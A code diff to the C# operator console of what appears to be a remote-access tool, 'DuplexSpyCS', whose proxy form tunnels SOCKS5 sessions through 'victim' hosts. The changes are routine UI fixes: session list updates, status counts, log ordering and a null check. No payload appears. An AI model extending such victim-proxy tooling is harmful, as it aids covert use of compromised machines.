@@ -38,6 +38,10 @@ namespace DuplexSpyCS
                         clsSocksSession session = m_ltnSocks5.Sessions[nStreamId];
                         ListViewItem item = new ListViewItem(nStreamId.ToString());
                         item.SubItems.Add(session.sktUser.RemoteEndPoint.ToString());
+
+                        listView1.Items.Add(item);
+
+                        toolStripStatusLabel1.Text = $"Session[{listView1.Items.Count}]";
                     }
                 }
                 catch (Exception ex)
@@ -53,6 +57,23 @@ namespace DuplexSpyCS
         public void fnOnProxyClosed(clsLtnProxy ltnProxy, int nStreamId, clsVictim victim)
         {
             m_ltnSocks5.fnOnProxyClose(nStreamId);
+
+            Invoke(new Action(() =>
+            {
+                try
+                {
+                    ListViewItem item = listView1.FindItemWithText(nStreamId.ToString());
+                    listView1.Items.Remove(item);
+
+                    toolStripStatusLabel1.Text = $"Session[{listView1.Items.Count}]";
+
+                    fnLogs($"Closed: Stream ID={nStreamId}");
+                }
+                catch (Exception ex)
+                {
+                    clsStore.sql_conn.WriteErrorLogs(victim, ex.Message);
+                }
+            }));
         }
 
         void fnRecv(clsListener listener, clsVictim victim, List<string> lsMsg)
@@ -71,12 +92,12 @@ namespace DuplexSpyCS
                             int nCode = int.Parse(lsMsg[3]);
                             int nStreamId = int.Parse(lsMsg[4]);
 
-                            fnLogs(nCode == 0 ? $"Stream ID={nStreamId} open failed." : $"Stream ID={nStreamId} open successfully.");
-
                             if (nCode == 0)
                                 return;
 
                             fnOnProxyOpened(m_ltnSocks5, nStreamId, victim);
+
+                            fnLogs(nCode == 0 ? $"Stream ID={nStreamId} open failed." : $"Stream ID={nStreamId} open successfully.");
                         }
                         else if (lsMsg[2] == "data")
                         {
@@ -117,6 +138,8 @@ namespace DuplexSpyCS
 
             toolStripComboBox1.SelectedIndex = 0;
             toolStripTextBox1.Text = "8000";
+
+            toolStripStatusLabel1.Text = $"Session[{listView1.Items.Count}]";
 
             m_victim.m_listener.ReceivedDecoded += fnRecv;
         }
@@ -214,7 +237,7 @@ namespace DuplexSpyCS
 
         private void frmProxy_FormClosing(object sender, FormClosingEventArgs e)
         {
-            if (m_ltnSocks5.m_bIsRunning)
+            if (m_ltnSocks5 != null && m_ltnSocks5.m_bIsRunning)
             {
                 DialogResult dr = MessageBox.Show(
                     "Proxy is running. You have to stop it before you exit.\n" +
